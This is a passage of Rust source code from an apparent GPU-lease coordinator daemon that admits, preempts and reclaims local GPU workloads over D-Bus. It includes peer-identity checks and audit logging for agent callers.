            wallpaper_throttle_inflight: None,
            last_wallpaper_throttle: None,
            wallpaper_free_ticks: 0,
            freed_seq: 0,
        }
    }
}

/// Basename of the launched program (argv[0]) — the keyhole's `holder` for an owned job, mapped
/// to a friendly name for the recognized launch profiles so the tray reads `batch (comfyui)`
/// rather than the raw `start-comfyui.sh` (and matches the keyhole WORKLOAD label). Unknown
/// launchers fall back to the bare basename (honest, never faked).
fn short_label(label: &str) -> String {
    let base = label
        .split_whitespace()
        .next()
        .map(|p| p.rsplit('/').next().unwrap_or(p).to_string())
        .unwrap_or_default();
    // An adopted lane's label IS its scope unit (`app-flatpak-org.blender.Blender-NNNN.scope`); collapse
    // it to a stable tray name rather than the noisy instance-id'd unit (ADR-0022 Phase 1).
    if base.starts_with("app-flatpak-org.blender.Blender-") {
        return "blender-lane".to_string();
    }
    match base.as_str() {
        "start-comfyui.sh" => "comfyui".to_string(),
        // Both `blender-render` (Cycles) and `eevee-render` (ADR-0023 P1) resolve to the same hardened
        // wrapper, so the launcher basename alone can't tell them apart at the tray. They share a label;
        // the lease-layer distinction is the footprint estimate, not the program. Honest, not faked.
        "render-wrapper.sh" => "blender-render".to_string(),
        _ => base,
    }
}

/// Snapshot the current holder into the keyhole's lease-mirror contract. Cheap — call it while
/// holding `Inner`, then write OFF the lock. No holder → all-empty (the UI shows "no contention").
/// A cooperative holder has no agentosd-known name, so `holder` stays empty (honest, not faked).
fn lease_snapshot(inner: &Inner) -> Lease {
    // ADR-0041: every mirror write carries the current drain-on-free counter, so the arbiter sees the
    // latest `freed_seq` whether the lease is held or idle.
    let freed_seq = inner.freed_seq;
    match inner.lease.holder_tier() {
        Some(t) => {
            let token = inner.lease.holder_token();
            let holder = inner
                .owned
                .as_ref()
                .filter(|j| j.token == token)
                .map(|j| short_label(&j.label))
                .unwrap_or_default();
            Lease { tier: t.as_str().to_string(), holder, preempt: inner.last_preempt.clone(), freed_seq }
        }
        None => Lease { freed_seq, ..Lease::default() },
    }
}

/// Atomic temp+rename publish of the lease mirror, ALWAYS called OFF the `Inner` lock
/// (ADR-0012 §3): a keyhole render reading this file must never be able to delay a SIGKILL, so
/// observation is strictly downstream of a file the daemon writes. Best-effort / fail-open — a
/// failed write just leaves the keyhole showing "no contention".
fn write_lease_mirror(path: Option<&Path>, snap: &Lease) {
    let Some(path) = path else { return };
    let Ok(json) = serde_json::to_string(snap) else { return };
    let tmp = path.with_file_name(format!(".lease.{}.tmp", std::process::id()));
    if std::fs::write(&tmp, json).is_ok() {
        let _ = std::fs::rename(&tmp, path);
    }
}

fn spawn_owned(argv: &[String]) -> std::io::Result<(Child, u32)> {
    let mut it = argv.iter();
    let prog = it
        .next()
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::InvalidInput, "empty argv"))?;
    let child = Command::new(prog)
        .args(it)
        // Own process group (R1): the child is its own group leader (pgid == pid), so a
        // launcher that forks workers (e.g. ComfyUI) is reclaimed as a whole group on evict.
        .process_group(0)
        .stdin(Stdio::null())
        // Fail-safe (ADR-0003): never leak an owned GPU process if the daemon dies.
        .kill_on_drop(true)
        .spawn()?;
    // A spawned child has a pid until reaped; None only if it died instantly → spawn anomaly.
    let pid = child
        .id()
        .ok_or_else(|| std::io::Error::other("child exited before id()"))?;
    Ok((child, pid))
}

/// Best-effort executable pre-flight so a bad `argv[0]` is caught *before* we evict an
/// incumbent (H3): only checks an absolute/relative path; a bare PATH name passes through.
fn looks_executable(prog: &str) -> bool {
    use std::os::unix::fs::PermissionsExt;
    if !prog.contains('/') {
        return true; // resolved via PATH at spawn time; can't cheaply check here
    }
    std::fs::metadata(prog)
        .map(|m| m.is_file() && m.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

/// SIGKILL the whole process group led by `pid` (set via `process_group(0)`), so a forking
/// owned job is fully reclaimed — `POST /free` is never trusted (ADR-0010 §5, finding R1).
fn sigkill_group(pid: u32) {
    // Safe: a kill(2) syscall with a constant signal; negative pid targets the group.
    unsafe {
        libc::kill(-(pid as i32), libc::SIGKILL);
    }
}

/// Reap an already-SIGKILLed child, BOUNDED (ADR-0041 §5a / ADR-0003 fail-open). Returns `true` iff the
/// leader was confirmed reaped within `budget` (so its CUDA context is torn down and its VRAM is
/// freeing); on timeout it detaches a background reaper (so the child can never zombie) and returns
/// `false` — the caller proceeds rather than stalling forever on an unkillable (e.g. D-state) child.
/// A free fn (no NVML) so the bound + fail-open behaviour is unit-testable without a GPU.
async fn reap_bounded(mut child: Child, budget: Duration) -> bool {
    if tokio::time::timeout(budget, child.wait()).await.is_ok() {
        true
    } else {
        tokio::spawn(async move {
            let _ = child.wait().await; // background reap — never leave a zombie
        });
        false
    }
}

/// Scaled safety headroom (H5 partial): self-reported model sizes undercount (ADR-0004
/// measured 19.5 GB for an 18 GB-reported model), so a flat 512 MiB is too thin on big
/// models. Keep ≥6% of the estimate, floored at the base headroom.
fn headroom_for(est_mib: u64) -> u64 {
    (est_mib / 16).max(HEADROOM_MIB)
}

/// H1: complete the preempt decision. After evicting the victim, will the successor fit?
/// Predicted free = current free + the victim's admitted footprint *iff we actually own
/// (and thus reclaim) it*; a cooperative victim frees nothing agentosd controls. Pure +
/// tested — the kill is authorized by priority, this just makes the consequence explicit.
fn fits_after_evict(free_mib: u64, victim_est: u64, reclaimable: bool, succ_est: u64, headroom: u64) -> bool {
    let predicted = if reclaimable { free_mib.saturating_add(victim_est) } else { free_mib };
    admit(predicted, succ_est, headroom).granted()
}

/// GO-2 identity gate (ADR-0021): may `requester` release `token`? A *bound* (cooperative) holder —
/// one whose token agentosd recorded against the acquiring bus name (`holder_peer`) — may be released
/// ONLY by that same peer, so one agent behind the MCP act surface can't release another's lease. An
/// authoritative system release (`None`: B4 peer-disconnect, B5 TTL) always may; an unbound holder (an
/// owned `Spawn` job, whose caller may have disconnected) stays token-only as before. Pure + tested.
fn may_release(holder_peer: Option<&(u64, String)>, token: u64, requester: Option<&str>) -> bool {
    match (requester, holder_peer) {
        (None, _) => true, // system/authoritative release (disconnect, TTL) — always permitted
        (Some(name), Some((bound_tok, bound_name))) if *bound_tok == token => name == bound_name,
        (Some(_), _) => true, // no binding for this token (owned job / unknown) — token-only guard
    }
}

/// GO-2 identity gate for `Renew` (ADR-0021 ratification must-fix #1): may `requester` renew `token`?
/// Renew shares the `release` identity predicate — a *bound* (cooperative) lease's TTL may be extended
/// ONLY by its acquiring peer; without this, a peer that guessed the monotonic token could pin or
/// indefinitely extend another holder's lease (defeating the B5 stuck-holder backstop). It additionally
/// requires `token` to be the *live* holder. An unbound (owned `Spawn`) holder stays token-only, so the
/// `busctl`-per-call dream client still renews across fresh connections. Pure + tested.
fn may_renew(
    holder_peer: Option<&(u64, String)>,
    holder_token: u64,
    holder_live: bool,
    token: u64,
    requester: Option<&str>,
) -> bool {
    may_release(holder_peer, token, requester) && holder_live && holder_token == token
}

/// An unguessable lease token for the agent act path (ADR-0021 ratification must-fix #5). Stdlib-only
/// entropy — no new dependency: a fresh `RandomState`'s SipHash keys are OS-seeded, so a fresh hasher's
/// initial state is a hard-to-predict `u64`. This is a NON-cryptographic obfuscation that raises the
/// cost of a shared-connection sibling ENUMERATING a live token; it is defence-in-depth, not the
/// authorization boundary (that is `holder_peer` identity binding + the MCP layer-2 session table —
/// release/renew never trust the token's secrecy alone). `.max(1)` keeps it non-zero (0 is the
/// "no holder" / "not granted" sentinel in `holder_token`/the wire contract), remapping only the lone 0.
fn random_agent_token() -> u64 {
    use std::hash::{BuildHasher, Hasher};
    std::collections::hash_map::RandomState::new().build_hasher().finish().max(1)
}

/// Release `token` — shared by the `Release` method (peer-identity-checked: `requester = Some(name)`)
/// and the authoritative supervisor paths (`requester = None`). True iff it was the holder AND the
/// requester was allowed (GO-2). Group-SIGKILLs + reaps an owned child, clears narration +
/// holder-peer when the lease goes idle, and republishes the keyhole mirror OFF the lock.
async fn release_token(
    inner: &Arc<Mutex<Inner>>,
    mirror: Option<&Path>,
    token: u64,
    requester: Option<&str>,
) -> bool {
    let (freed, to_reap, snap) = {
        let mut g = inner.lock().await;
        if !may_release(g.holder_peer.as_ref(), token, requester) {
            return false; // GO-2: foreign-token release — refuse, identical to an unknown token
        }
        let freed = g.lease.release(token);
        let mut to_reap: Option<Reclaim> = None;
        if freed {
            if let Some(job) = g.owned.take() {
                if job.token == token {
                    to_reap = Some(job.reclaim);
                } else {
                    g.owned = Some(job);
                }
            }
            if g.holder_peer.as_ref().is_some_and(|(t, _)| *t == token) {
                g.holder_peer = None;
            }
            g.holder_deadline = None; // B5: no holder → no deadline
            g.holder_ttl = None; // ADR-0021 #3: no holder → no remembered TTL
            if g.lease.holder_tier().is_none() {
                g.last_preempt.clear();
                // ADR-0041: the lease just freed → bump the drain-on-free signal so the arbiter wakes
                // and re-nominates a waiter. The snapshot below carries the new value.
                g.freed_seq = g.freed_seq.wrapping_add(1);
            }
        }
        (freed, to_reap, lease_snapshot(&g))
    };
    if freed {
        write_lease_mirror(mirror, &snap);
        match to_reap {
            // A spawned child: releasing means "done with the GPU" → SIGKILL the group + reap the leader.
            Some(Reclaim::Spawned { mut child, pid }) => {
                sigkill_group(pid);
                tokio::spawn(async move {
                    let _ = child.wait().await; // reap the leader (no zombie)
                });
            }
            // An adopted lane: Release = stop coordinating it, NOT kill it. agentosd didn't spawn the
            // user's Blender; the pinned dir-fd drops (closed) here and the lane runs on uncoordinated
            // until it exits on its own (its natural-exit auto-release / TTL still apply). (ADR-0022)
            Some(Reclaim::Scope { handle, .. }) => {
                println!("coordd: released adopted lane `{}` — left running (not agentosd-owned)", handle.scope_unit);
            }
            None => {}
        }
    }
    freed
}

// ---------------------------------------------------------------------------
// D-Bus shell (zbus, session bus, tokio reactor).
// ---------------------------------------------------------------------------

struct Coordinator {
    inner: Arc<Mutex<Inner>>,
    gpu: Arc<GpuBackend>,
    /// `$XDG_RUNTIME_DIR/nimbus-aurora/lease.json` — the keyhole's arbitration mirror, or None
    /// if the runtime dir is unavailable (the daemon still runs; the keyhole shows no contention).
    mirror: Option<PathBuf>,
}

impl Coordinator {
    /// Shared path for `Acquire`/`AcquireAgent` (cooperative), `Spawn` (owned child) and `AdoptScope`
    /// (owned flatpak lane scope). The lock is held across the decision AND the spawn/evict so the lease
    /// and the holder it controls never disagree. The destructive reclaim itself runs OFF the lock
    /// (review C5). Returns a TYPED `AcquireOutcome` (ADR-0021 #2): the trusted verbs shape it back to
    /// their `(granted, token, prose)` wire, the agent verb to the typed `code`/numeric channel.
    async fn do_acquire(
        &self,
        caller: Option<String>,
        class: CallerClass,
        tier_name: String,
        estimate_mib: u32,
        kind: AcquireKind,
    ) -> AcquireOutcome {
        use std::fmt::Write as _;

        let requested = match Tier::from_arg(&tier_name) {
            Ok(t) => t,
            Err(e) => {
                return AcquireOutcome {
                    code: OutcomeCode::Error,
                    token: 0,
                    tier_effective: String::new(), // unparseable — no effective tier to report
                    msg: format!("error: {e}"),
                    short_mib: 0,
                    retry_after_ms: 0,
                }
            }
        };
        // ADR-0021 GO-1: clamp the requested tier to the caller class HERE, in core, before any
        // admission or arbitration — an agent can never hold a tier that preempts the desktop, on
        // ANY transport (a guard in the MCP shell would be bypassed by a second D-Bus client). WHO
        // is an `Agent` is the GO-2 identity question; this is the clamp that question relies on.
        // Today every caller is `Trusted`, so this is a no-op until the `act` verbs land.
        let tier = class.clamp(requested);
        let est = estimate_mib as u64;
        let headroom = headroom_for(est);

        // GO-2 (review: security Low) — an Agent lease's ENTIRE release/renew authority rests on
        // `holder_peer` being bound to the acquiring connection. On a real session bus `hdr.sender()` is
        // always present (the bus stamps the unique name), but if it were ever absent the lease would
        // install UNBOUND and `may_release` would fall through to the token-only path — any local peer
        // could then release it. The trusted `Spawn`/`busctl`-per-call path is fine unbound (its liveness
        // is the child's), but an agent MUST be identity-bound — so refuse the grant rather than install
        // an unbindable agent lease. Fail CLOSED.
        if matches!(class, CallerClass::Agent) && caller.is_none() {
            return AcquireOutcome {
                code: OutcomeCode::Error,
                token: 0,
                tier_effective: tier.as_str().to_string(),
                msg: "error: agent lease cannot be identity-bound (no D-Bus sender) — refused".into(),
                short_mib: 0,
                retry_after_ms: 0,
            };
        }

        // H3: pre-flight the binary BEFORE we lock/evict, so a bad argv can't destroy an
        // incumbent. (PATH-relative names pass through; resolved at spawn time.)
        if let AcquireKind::Spawn(args) = &kind {
            if args.is_empty() {
                return AcquireOutcome {
                    code: OutcomeCode::Error,
                    token: 0,
                    tier_effective: tier.as_str().to_string(),
                    msg: "spawn: empty argv".into(),
                    short_mib: 0,
                    retry_after_ms: 0,
                };
            }
            if !looks_executable(&args[0]) {
                return AcquireOutcome {
                    code: OutcomeCode::Error,
                    token: 0,
                    tier_effective: tier.as_str().to_string(),
                    msg: format!("spawn: `{}` is not an executable file", args[0]),
                    short_mib: 0,
                    retry_after_ms: 0,
                };
            }
        }

        // R2: distinguish "couldn't read VRAM" (None) from "0 free".
        let mut free_opt = free_mib(&self.gpu).await;

        // ADR-0018 §2 — GRACEFUL RECLAIM BEFORE THE SLEDGEHAMMER. A heavy-lane (batch/best-effort)
        // request that would be VRAM-denied gets ONE off-lock warm-pool reclaim first: `ollama stop`
        // resident models cold-first, RE-MEASURE free VRAM (never predict — we don't own Ollama's PID,
        // acceptance #2), then fall through to the normal locked admission, which re-checks fit against
        // the freshly measured `free_opt` (that locked `admit` stays the SOLE gate — no TOCTOU). We only
        // reclaim when the lease is FREE: a held lease Queues/Preempts regardless of VRAM (warm-pool
        // unload wouldn't help), so the cheap peek-lock below filters that out and avoids a wasted stop.
        // The whole step is fail-open (ADR-0003): an unreachable Ollama or a stalled unload just leaves
        // `free_opt` unchanged and the request denies honestly, exactly as before this code existed.
        if warm_reclaim_eligible(tier, free_opt, est, headroom) {
            let now = Instant::now();
            let go = {
                let mut g = self.inner.lock().await; // brief peek — dropped before any I/O
                let lease_free = g.lease.holder_tier().is_none();
                let cooling = g.last_warm_reclaim.is_some_and(|t| now < t + warm_reclaim_dwell());
                if lease_free && !cooling {
                    g.last_warm_reclaim = Some(now); // mark intent (anti-strobe) — held with the lock
                    true
                } else {
                    false
                }
            };
            if go {
                let r = crate::reclaim::RealReclaimer { gpu: Arc::clone(&self.gpu) };
                let out = crate::reclaim::reclaim_until_fits(
                    &r,
                    est,
                    headroom,
                    crate::reclaim::DEFAULT_MAX_STOPS,
                    crate::reclaim::DEFAULT_POLL_TRIES,
                    crate::reclaim::DEFAULT_POLL_INTERVAL,
                )
                .await;
                if !out.stopped.is_empty() || !out.offloaded.is_empty() {
                    eprintln!(
                        "coordd: ADR-0018 §2 graceful reclaim for {} (est {est}M): ollama stop {:?}; \
                         free {}M→{}M ({}){}",
                        tier.as_str(),
                        out.stopped,
                        out.free_before,
                        out.free_after,
                        if out.satisfied { "now fits" } else { "still short — denies (fail-closed)" },
                        if out.offloaded.is_empty() {
                            String::new()
                        } else {
                            format!("; warm-pool offloaded (size_vram<size): {:?}", out.offloaded)
                        },
                    );
                }
                // Re-admit against the freshly MEASURED free VRAM (measure-don't-predict): the locked
                // admission below is the gate, now reading the post-reclaim number.
                if !out.stopped.is_empty() {
                    free_opt = Some(out.free_after);
                }
            }
        }

        // ADR-0029 §3 — THROTTLE THE WALLPAPER BEFORE DENYING (the second reclaim source, after the warm
        // pool). If a heavy request would STILL be VRAM-denied and a throttleable wallpaper (UE) is
        // registered, ask it to shrink to its FLOOR rung over Remote Control, RE-MEASURE free VRAM
        // (conservatively — poll, never predict), then fall through to the locked `admit` (the SOLE
        // gate). UE STAYS resident at floor (coexist); the supervisor restores it to full the instant no
        // gen holds the lease (the INVARIANT restore). DORMANT until a wallpaper REGISTERS:
        // `throttleable_wallpaper` is None by default, so this whole block is a no-op on the live setup.
        // Mirrors the warm-reclaim choreography (peek-lock → mark intent → drop → OFF-lock blocking RC
        // via spawn_blocking → re-measure → locked admit), so NO MutexGuard is ever held across an await.
        let wp_now = {
            let g = self.inner.lock().await;
            g.throttleable_wallpaper // Copy — guard dropped at this brace, nothing held across an await
        };
        if wallpaper_throttle_eligible(tier, free_opt, est, headroom, wp_now, min_throttle_gain_mib()) {
            // Claim the throttle under the lock — serializes concurrent acquires (one throttles; a second
            // that finds it already throttled/in-flight admits against the already-floored free) and
            // applies the anti-strobe dwell. Re-reads the registration under the lock so a concurrent
            // Unregister/crash between the eligible-peek and here aborts the claim.
            let now = Instant::now();
            let claim = {
                let mut g = self.inner.lock().await;
                let cooling = g.last_wallpaper_throttle.is_some_and(|t| now < t + warm_reclaim_dwell());
                if g.throttleable_wallpaper.is_some()
                    && !g.wallpaper_throttled
                    && g.wallpaper_throttle_inflight.is_none()
                    && !cooling
                {
                    g.wallpaper_throttle_inflight = Some(now); // claimed; cleared off-lock after the RC call
                    g.last_wallpaper_throttle = Some(now);
                    true
                } else {
                    false
                }
            }; // guard dropped BEFORE the blocking RC call
            if claim {
                // OFF-lock blocking PUT (250 ms-bounded). A JoinError (the blocking task panicked) degrades
                // to Unreachable = "did not take" — never a panic on the arbitration path (ADR-0003).
                let outcome = tokio::task::spawn_blocking(|| {
                    crate::rc_throttle::apply_rung(crate::governor::Rung::Floor)
                })
                .await
                .unwrap_or(crate::rc_throttle::ThrottleOutcome::Unreachable);
                let took = outcome.took();
                // Poll-don't-single-shot: take the conservative settled free, only when the throttle took.
                let settled = if took { poll_free_settled(&self.gpu).await } else { None };
                {
                    let mut g = self.inner.lock().await;
                    g.wallpaper_throttle_inflight = None;
                    if took {
                        g.wallpaper_throttled = true; // the supervisor's invariant restore now owns the undo
                    }
                }
                // Cardinal-sin guard: ONLY raise free_opt to the re-measured settled free, and ONLY on a
                // real Applied throttle — NEVER admit against VRAM a Rejected/Unreachable throttle did not
                // free. The locked `admit` below stays the SOLE gate, now reading the freed number.
                if took {
                    if let Some(f) = settled {
                        if f > free_opt.unwrap_or(0) {
                            free_opt = Some(f);
                        }
                    }
                    eprintln!(
                        "coordd: ADR-0029 §3 throttle UE full→floor for {} (est {est}M): free now {:?}M; coexist",
                        tier.as_str(),
                        free_opt,
                    );
                }
            }
        }

        let mut inner = self.inner.lock().await;
        let prev_est = inner.lease.holder_est().unwrap_or(0);
        let prev_tier = inner.lease.holder_tier();

        // C7: a just-preempted tier must wait out its dwell before re-acquiring (anti-strobe).
        let now = Instant::now();
        if cooling_down(inner.cooldown, tier, now) {
            // The agent gets the PRECISE remaining dwell as `retry_after_ms` (it knows exactly when it
            // may re-acquire); the MCP layer folds `cooling` into the agent-visible `busy_retry` (#2).
            let retry_after_ms = inner
                .cooldown
                .map(|(_, until)| until.saturating_duration_since(now).as_millis() as u64)
                .unwrap_or(0);
            return AcquireOutcome {
                code: OutcomeCode::Cooling,
                token: 0,
                tier_effective: tier.as_str().to_string(),
                msg: format!(
                    "cooling down: {} was preempted recently — retry shortly (anti-strobe, ADR-0013 C7)",
                    tier.as_str()
                ),
                short_mib: 0,
                retry_after_ms,
            };
        }

        // Fresh-grant admissibility, with fail-open per tier (ADR-0003): on an unreadable
        // GPU, interactive (top tier) grants anyway — never block live AI on a read blip —
        // while batch/best-effort fail *closed* (don't start a heavy job blind).
        let admit_ok = match free_opt {
            Some(free) => admit(free, est, headroom).granted(),
            None => tier == Tier::Interactive,
        };
        let admission = if admit_ok {
            Admission::Grant { free_mib: free_opt.unwrap_or(0), est_mib: est, headroom_mib: headroom }
        } else {
            Admission::Deny {
                free_mib: free_opt.unwrap_or(0),
                est_mib: est,
                headroom_mib: headroom,
                short_mib: 0,
            }
        };

        // ADR-0021 #5: an Agent-class grant gets an unguessable RANDOM token (a shared-connection
        // sibling can't enumerate it); trusted callers keep the monotonic sequential token (the public
        // `acquire`) the busctl smoke tests + dream client expect. The clamp/admit/arbitrate core is
        // identical regardless — only the minted token value differs.
        let result = match class {
            CallerClass::Agent => {
                inner.lease.acquire_with(tier, &admission, TokenKind::Random(random_agent_token()))
            }
            CallerClass::Trusted => inner.lease.acquire(tier, &admission),
        };

        // preempted = Some((victim_token, fit_verdict)); fit verdict completes the decision (H1).
        let (token, preempted) = match result {
            AcquireResult::Queued => {
                // NO wait-queue (ADR-0001): the loser retries, it holds no place → `busy_retry`, never
                // the word "queued" on the agent path (ADR-0021 #2 / GO-2 outcome words). The trusted
                // verbs still get the descriptive prose below for the keyhole/log.
                return AcquireOutcome {
                    code: OutcomeCode::BusyRetry,
                    token: 0,
                    tier_effective: tier.as_str().to_string(),
                    msg: format!(
                        "queued: lease held by {} (token {})",
                        inner.lease.holder_tier().map_or("?", Tier::as_str),
                        inner.lease.holder_token()
                    ),
                    short_mib: 0,
                    retry_after_ms: AGENT_BUSY_RETRY_HINT_MS,
                };
            }
            AcquireResult::Denied => {
                let (msg, short_mib) = match free_opt {
                    None => (
                        format!(
                            "declined: VRAM unreadable — {} batch fails closed (won't start blind); \
                             interactive would fail open",
                            tier.as_str()
                        ),
                        0,
                    ),
                    Some(free) => {
                        let short = match admit(free, est, headroom) {
                            Admission::Deny { short_mib, .. } => short_mib,
                            _ => 0,
                        };
                        (
                            format!("denied: short {short}M (free {free}M vs est {est}M + headroom {headroom}M)"),
                            short,
                        )
                    }
                };
                return AcquireOutcome {
                    code: OutcomeCode::Denied,
                    token: 0,
                    tier_effective: tier.as_str().to_string(),
                    msg,
                    short_mib,
                    retry_after_ms: 0,
                };
            }
            AcquireResult::Granted { token } => (token, None),
            AcquireResult::Preempted { token, victim } => {
                // H1: re-verify fit against PREDICTED post-eviction free (current + the
                // victim's admitted footprint, iff we actually own/reclaim it). The kill is
                // authorized by priority; this completes the *decision* and warns the caller.
                let reclaimable = inner.owned.as_ref().is_some_and(|j| j.token == victim);
                let fit = match free_opt {
                    Some(free) => {
                        if fits_after_evict(free, prev_est, reclaimable, est, headroom) {
                            "fits"
                        } else {
                            "WONT-FIT"
                        }
                    }
                    None => "fit-unknown",
                };
                // C7: start the evicted tier's anti-strobe cooldown.
                inner.cooldown = prev_tier.map(|t| (t, Instant::now() + preempt_dwell()));
                (token, Some((victim, fit)))
            }
        };

        // Evict the previously-owned holder on preemption — carry its reclaim handle OUT so we run the
        // destructive reclaim OFF the lock (review C5). A Spawned victim is group-SIGKILLed + reaped
        // (R1/H2); a Scope victim is cgroup.killed via its pinned fd then confirmed freed (ADR-0022 B2).
        let mut evicted: Option<(String, Reclaim, &'static str)> = None;
        if let Some((victim, fit)) = preempted {
            if let Some(job) = inner.owned.take() {
                if job.token == victim {
                    evicted = Some((job.label, job.reclaim, fit));
                } else {
                    inner.owned = Some(job); // not the victim (shouldn't happen) — keep it
                }
            }
        }

        // Narrate the contention for the keyhole's arbitration line (set under the lock,
        // published off it). A fresh, uncontended grant clears it → "no contention".
        inner.last_preempt = match (preempted, &evicted) {
            (Some((_, fit)), Some((label, _, _))) => {
                format!("{} preempted `{}` ({fit})", tier.as_str(), short_label(label))
            }
            (Some((victim, fit)), None) => {
                format!("{} preempted token {victim} ({fit})", tier.as_str())
            }
            _ => String::new(),
        };

        // Install the holder's reclaim handle (under the lock). Cooperative: nothing to own (the caller
        // runs its own process). Spawn: agentosd spawns + OWNS a child — on spawn failure roll the lease
        // back (a lease without its process is worse than no lease) and reclaim any victim. AdoptScope:
        // record the flatpak lane's pinned cgroup scope as the reclaim handle (ADR-0022 Phase 1).
        let mut owned_pid: Option<u32> = None;
        let bind_peer = !matches!(kind, AcquireKind::Spawn(_));
        let kind_note = match &kind {
            AcquireKind::AdoptScope { handle, lane_pid, .. } => {
                Some(format!("adopted lane `{}` (pid {lane_pid})", handle.scope_unit))
            }
            _ => None,
        };
        match kind {
            AcquireKind::Cooperative => {}
            AcquireKind::Spawn(args) => match spawn_owned(&args) {
                Ok((child, pid)) => {
                    owned_pid = Some(pid);
                    inner.owned =
                        Some(OwnedJob { token, label: args.join(" "), reclaim: Reclaim::Spawned { child, pid } });
                }
                Err(e) => {
                    inner.lease.release(token);
                    drop(inner);
                    if let Some((label, reclaim, _)) = evicted {
                        eprintln!("coordd: spawn failed after preempting `{}` — reclaiming it", short_label(&label));
                        self.perform_reclaim(label, reclaim, "n/a", free_opt.unwrap_or(0)).await;
                    }
                    // Lease rolled back → publish "no contention" (off-lock; inner is dropped).
                    write_lease_mirror(self.mirror.as_deref(), &Lease::default());
                    return AcquireOutcome {
                        code: OutcomeCode::Error,
                        token: 0,
                        tier_effective: tier.as_str().to_string(),
                        msg: format!("spawn failed: {e}"),
                        short_mib: 0,
                        retry_after_ms: 0,
                    };
                }
            },
            AcquireKind::AdoptScope { handle, dir, lane_pid } => {
                let label = handle.scope_unit.clone();
                inner.owned =
                    Some(OwnedJob { token, label, reclaim: Reclaim::Scope { handle, dir, lane_pid } });
            }
        }

        // Record the caller's bus name for peer-disconnect auto-release (B4) + GO-2 identity binding —
        // for a *cooperative* holder (its own process IS the GPU user) AND for an *adopted lane* (so only
        // the adopter may `Release` it, review B2 — the small monotonic token alone is guessable). A
        // `Spawn` job stays unbound (`None`): the daemon owns the child and the `busctl`-per-call caller
        // may disconnect between Spawn and Release. The supervisor SKIPS the B4 disconnect-release for any
        // owned holder (Spawn or Scope), so a fire-and-forget launcher exiting can't drop a live lane.
        inner.holder_peer = if bind_peer { caller.map(|c| (token, c)) } else { None };
        // B5 TTL clock — per trust class (ADR-0021 #3): an Agent lease gets the short ~90s backstop
        // (+ the MCP server heartbeat), a Trusted lease the 90-min dream default. Stored so `Renew`
        // re-applies the SAME interval (never promotes an agent lease to the long default).
        let ttl = ttl_for(class);
        inner.holder_ttl = Some(ttl);
        inner.holder_deadline = Some(Instant::now() + ttl);

        let mirror_snap = lease_snapshot(&inner);
        drop(inner);

        // Reclaim the evicted victim OFF the lock (review C5): a Spawned victim → group SIGKILL + reap;
        // a Scope victim → cgroup.kill via its pinned fd, then backpressure the grant until VRAM frees.
        // Whether a SIGKILL/cgroup reclaim actually ran (an OWNED victim). Captured before `evicted` is
        // moved into the reclaim, so the ADR-0029 §3 log below can be honest about the backstop.
        let victim_reclaimed = evicted.is_some();
        if let Some((label, reclaim, fit)) = evicted {
            self.perform_reclaim(label, reclaim, fit, free_opt.unwrap_or(0)).await;
        }

        // ADR-0029 §3: if the victim was the live UE wallpaper (`Tier::Yielding`), surface the
        // governor's PROACTIVE throttle-not-kill decision (the two-number-footprint call, D4). NB the
        // RC throttle TRANSPORT and the lease-side coexistence model are unbuilt (ADR-0029 Open §B +
        // the reservation model), so an OWNED `Yielding` victim still took the SIGKILL backstop above —
        // this logs the decision the governor WILL enact (throttle UE to floor + coexist, or kill) once
        // the hardened Remote Control client lands. Computed off the lock from the pre-eviction footprints.
        if prev_tier == Some(Tier::Yielding) {
            let action = crate::governor::plan_preemption(crate::coord::yield_decision(
                free_opt.unwrap_or(0),
                prev_est,        // UE's current (full) footprint = its admitted estimate
                ue_floor_mib(),  // UE's throttled-floor footprint (Phase-A ~1 GB; re-measure per tableau)
                est,
                headroom,
            ));
            // Honest about what ACTUALLY happened: an owned UE PID took the SIGKILL backstop; a
            // cooperative (unowned) wallpaper did not (it must self-release — not the intended profile).
            let backstop = if victim_reclaimed {
                "SIGKILL backstop applied"
            } else {
                "no owned PID — cooperative victim must self-release"
            };
            eprintln!(
                "coordd: ADR-0029 §3 — {} preempted the UE wallpaper; governor decision: {} \
                 [RC throttle + coexistence GATED on ADR-0029 §B → {backstop}]",
                tier.as_str(),
                action.describe(),
            );
        }

        // Publish the new arbitration state to the keyhole mirror — OFF the lock (ADR-0012 §3).
        write_lease_mirror(self.mirror.as_deref(), &mirror_snap);

        let mut msg = match preempted {
            Some((victim, fit)) => {
                format!("granted {} token {token}; preempted token {victim} ({fit})", tier.as_str())
            }
            None => format!("granted {} token {token}", tier.as_str()),
        };
        match free_opt {
            Some(free) => { let _ = write!(msg, " (free {free}M)"); }
            None => msg.push_str(" (free unknown)"),
        }
        if let Some(pid) = owned_pid {
            let _ = write!(msg, "; agentosd owns pid {pid}");
        }
        if let Some(note) = kind_note {
            let _ = write!(msg, "; {note}");
        }
        // H1: a granted-but-won't-fit preempt is loud — the successor must offload/shrink.
        if matches!(preempted, Some((_, "WONT-FIT"))) {
            eprintln!(
                "coordd: WARNING token {token} granted but WONT-FIT after eviction — \
                 successor must offload/shrink (ADR-0004)"
            );
        }
        // Audit (ADR-0021 ratification — responsible-AI lens): an autonomous agent just took a real
        // action on the GPU. Record the OPERATION only — tier, est, token — never the agent's task or
        // prompt (ops-only; no behavioural capture). Trusted callers are not audited here (Hermes/human).
        if matches!(class, CallerClass::Agent) {
            println!(
                "coordd: AGENT acquired {} token {token} (est {est}M, ttl {}s) — audit",
                tier.as_str(),
                ttl.as_secs()
            );
        }
        AcquireOutcome {
            code: OutcomeCode::Granted,
            token,
            tier_effective: tier.as_str().to_string(),
            msg,
            short_mib: 0,
            retry_after_ms: 0,
        }
    }

    /// CONFIRM an evicted owned child's VRAM is actually freed before the caller's grant returns
    /// (ADR-0041 §5a — close the over-admit window). The SIGKILL (to the group) has already been sent;
    /// `reap_bounded` waits for the leader so the Δ is read after *actual* exit (H2), not a fixed-sleep
    /// guess — and, unlike the prior DETACHED reap, the `do_acquire` preempt path AWAITS this, so a
    /// successor can never allocate into not-yet-freed VRAM (the cardinal sin: UE crashes, not degrades).
    /// Mirrors `reclaim_scope`'s confirm-then-read backpressure. Fail-open on a stuck child: `reap_bounded`
    /// detaches a reaper and we proceed (the next admission's true-free NVML read governs).
    async fn confirm_spawned_reclaim(&self, child: Child, before: u64) {
        if !reap_bounded(child, SPAWNED_REAP_TIMEOUT).await {
            eprintln!(
                "coordd: WARNING evicted child not reaped within {SPAWNED_REAP_TIMEOUT:?} — \
                 proceeding (fail-open, ADR-0003; next admission's true-free read governs)"
            );
        }
        tokio::time::sleep(Duration::from_millis(150)).await; // brief driver settle
